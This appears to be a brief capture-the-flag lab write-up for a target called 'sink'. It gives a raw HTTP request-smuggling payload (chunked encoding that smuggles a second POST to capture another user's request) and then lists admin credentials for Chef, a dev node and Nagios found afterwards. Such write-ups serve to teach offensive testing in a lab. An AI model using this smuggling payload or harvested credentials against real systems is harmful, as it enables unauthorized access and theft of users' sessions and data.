### Write ups

### Make the chunked working
Add zero before the second request due to rfc like serialized format. In order to send multiple data in one packet on differenct tcp connections.

```burp
POST /comment HTTP/1.1
Host: 10.129.97.231:5000
Content-Length: 243
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.97.231:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.97.231:5000/home
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=eyJlbWFpbCI6ImZvb0BiYXIuY29tIn0.Y7zvZw.3_5f9jRl6XBlL7IZEy0OA7-YuY4
Transfer-Encoding:chunked

4
msg=
0

POST /notes HTTP/1.1
Host: localhost:5000
Content-Length: 300
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Cookie: session=eyJlbWFpbCI6ImZvb0BiYXIuY29tIn0.Y7zvZw.3_5f9jRl6XBlL7IZEy0OA7-YuY4

note=
```

### After gain the web admin

* Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz 

* Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3 

* Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\{*L.fB3C 